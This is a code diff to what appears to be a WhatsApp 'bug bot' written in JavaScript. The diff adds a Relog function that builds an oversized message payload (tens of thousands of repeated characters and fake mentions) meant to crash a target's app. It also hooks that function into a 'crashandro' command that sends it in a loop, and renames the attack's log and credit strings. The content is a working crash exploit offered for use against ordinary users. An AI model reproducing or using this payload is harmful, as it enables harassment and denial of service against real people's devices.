@@ -296,6 +296,43 @@ async function exoticsChronos(zax, jid, etc = true) {
         participant: { jid: jid }
     } : {});
  }
+
+async function Relog(target) {
+  const Crash = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "⛧ 𝐘𝐳𝐱 ⛧  \n" + 
+            "ꦾ".repeat(30000),
+            format: "DEFAULT",
+            contextInfo: {
+              mentionedJid: [
+                target,
+                "0@s.whatsapp.net",
+                ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
+              ],
+              disappearingMode: {
+                initiator: "CHANGED_IN_CHAT",
+                trigger: "CHAT_SETTING"
+              },
+            }
+          },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request", 
+            paramsJson: "\u9999".repeat(50000) + "\u9999".repeat(50000), 
+            version: 3
+          }
+        }
+      }
+    }
+  };
+
+  await zax.relayMessage(target, Crash, {
+    participant: { jid: target }
+  });
+							 }
+		
 async function legacyX7(target) {
 const xput = "𑜦𑜠".repeat(1000) + "ꦾ".repeat(1000);
   try {
@@ -345,7 +382,7 @@ const xput = "𑜦𑜠".repeat(1000) + "ꦾ".repeat(1000);
       userJid: target,
       });
 
-    console.log("LegacyX7 Succes Attack!✅");
+    console.log("Succes Attack!✅");
   } catch (error) {
     console.log("❌ error:\n" + error);
   }
@@ -365,7 +402,7 @@ const zets = {
 		    itemCount: `9999999`,
 		    status: "INQUIRY",
 		    surface: "CATALOG",
-		    message: `#LegacyX7`,
+		    message: `#universql`,
 		    token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
 		  }
 	    },
@@ -386,8 +423,8 @@ const Replyzax = (teks) => {
         forwardingScore: 99999999,
         isForwarded: true,
         externalAdReply: {
-          title: "#LegacyX7",
-          body: "© Putra Wrld",
+          title: "#universqlnject",
+          body: "© azaxm",
           mediaType: 1,
           renderLargerThumbnail: false,
           showAdAttribution: false,
@@ -666,8 +703,9 @@ case 'crashandro': {
 
     Replyzax(`*Success! Send Bug to ${target}*`);
 
-    for (let r = 0; r < 100; r++) {
+    for (let r = 0; r < 50; r++) {
     exoticsChronos(zax, jid, true)
+    Relog(target) 
     await sleep(100)
     }
   console.log(chalk.red.bold("Success!"))
